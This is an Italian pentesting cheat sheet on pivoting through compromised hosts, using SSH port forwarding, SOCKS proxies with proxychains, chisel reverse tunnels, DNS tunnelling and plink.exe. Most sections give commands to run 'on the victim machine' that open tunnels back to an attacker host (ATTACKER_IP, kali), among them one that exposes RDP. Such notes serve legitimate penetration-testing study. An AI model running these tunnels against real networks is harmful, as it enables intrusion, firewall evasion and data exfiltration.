---
---
---
#### INDICE

- [[#Introduzione]]
- [[#Linux]]
	1. [[#Local Port Forwarding]]
	2. [[#Dynamic Port Forwarding (SOCKS)]]
	3. [[#Remote Port Forwarding]]
	4. [[#SSH Remote Dynamic Port Forwarding]]
	5. [[#Reverse Port Forwarding]]
- [[#Windows]]
	1. [[#ssh.exe]]
	2. [[#plink.exe]]

---
---
---
### Introduzione
Il **Port Forwarding / Tunneling** è una tecnica utilizzata per accedere a servizi non esposti, muoversi all'interno di una rete e bypassare firewall. In questi ambienti è spesso utilizzato il protocollo SSH in quanto ritenuto affidabile in questi ambienti e dunque difficilmente bloccato.

---
### Linux
#### Local Port Forwarding
Espone **un servizio remoto** su una **porta locale** della macchina attaccante.

```
# Sulla macchina Target
ssh -L <LOCAL_PORT>:<TARGET_HOST>:<TARGET_PORT> user@pivot
```

```
ssh -L 8080:127.0.0.1:80 user@target
```
#### Dynamic Port Forwarding (SOCKS)
Crea un SOCKS proxy che permette di raggiungere qualsiasi host/porta accessibile dal pivot.

```
# Eseguire sulla macchina vittima
ssh -D <LOCAL_PORT> <USERNAME>@<KALI_IP>
```

Configurare il file `/etc/proxychains4.conf`:

```
socks5 127.0.0.1 <LOCAL_PORT>
```

Premettere il comando `proxychains` prima di ogni comando:

```
# Esempi d'uso
proxychains nmap -sT -Pn 10.10.10.5
proxychains smbclient //10.10.10.5/Share
```
#### Remote Port Forwarding
Espone un servizio interno su una porta del tuo host, sfruttando una connessione in uscita dalla vittima.

Concettualmente simile a una reverse shell, ma per le porte.

```
# Esesuire sulla macchina vittima
ssh -N -R <LOCAL_ON_ATTACKER>:<TARGET_HOST>:<TARGET_PORT> attacker@kali
```

Adesso i servizi della macchina vittima sono accessibili dalla propria kali.
#### SSH Remote Dynamic Port Forwarding
Crea un **SOCKS proxy su Kali**, ma il tunnel viene **iniziato dal target**.

```
# Esesuire sulla macchina vittima
ssh -N -R 9998 kali@ATTACKER_IP
```

Configurare il file `/etc/proxychains4.conf`:

```
socks5 127.0.0.1 <LOCAL_PORT>
```

Premette il comando `proxychains` prima di ogni comando:

```
# Sulla macchina attaccante
proxychains psql -h 10.10.10.10 -U postgres
proxychains nmap -sT -Pn 10.10.10.0/24
```

Crea un SOCKS proxy sul tuo host, ma il tunnel è iniziato dalla vittima.
#### Reverse Port Forwarding
Il **reverse port forward** permette al **client (target)** di pubblicare un servizio interno **sul server (Kali)**.

Avviare [chisel](https://github.com/jpillora/chisel/releases) in modalità server sulla propria macchina kali:

```
chisel server --reverse -p <LPORT_SERVER>
```

Scaricare il tool chisel sulla macchina target ed avviarlo col seguente comando:

```
chisel client <IP_KALI>:<LPORT_SERVER> R:<RPORT>:<IP_TARGET>:<LPORT>
```

Da ora il servizio remoto è reindirizzato sulla propria kali e dunque accessibile

#### DNS Tunneling
Il **DNS tunneling** è una tecnica che consente di **infiltrare o esfiltrare dati** da una rete interna utilizzando esclusivamente il protocollo DNS (UDP/53).  La macchina target non comunica direttamente con internet, ma effettua una richiesta al DNS server controllato dall'attaccante.

Monitoriamo il traffico DNS:

```
sudo tcpdump -i ens192 udp port 53
```

Avviamo il server DNS:

```
sudo dnsmasq -C dnsmasq_txt.conf -d
```

Dal target avviamo una richiesta DNS:

```
# Esempio
nslookup -type=txt <ATTACKER_DOMAIN>
```

---
### Windows
#### ssh.exe

```
# Esegurie sulla macchina vittima
ssh -N -R <LPORT> attacker@kali
```

Configurare il file `/etc/proxychains4.conf`:

```
socks5 127.0.0.1 <LPORT>
```

Premettere il comando `proxychains` prima di ogni comando:

```
# Esempi d'uso
proxychains nmap -sT -Pn 10.10.10.5
proxychains smbclient //10.10.10.5/Share
```
#### Plink.exe
Installare [plink.exe](https://github.com/fwbuilder/w32-bin/blob/master/plink.exe.gpg) sulla macchina vittima ed eseguire il comando:

```
plink.exe -ssh -l kali -pw <PASS> -R 127.0.0.1:9833:127.0.0.1:3389 ATTACKER_IP
```

Adesso si può effettuare l'accesso tramite RDP:

```
xfreerdp /v:127.0.0.1:<LPORT> /u:<USERNAME> /p:<PASSWORD>
```


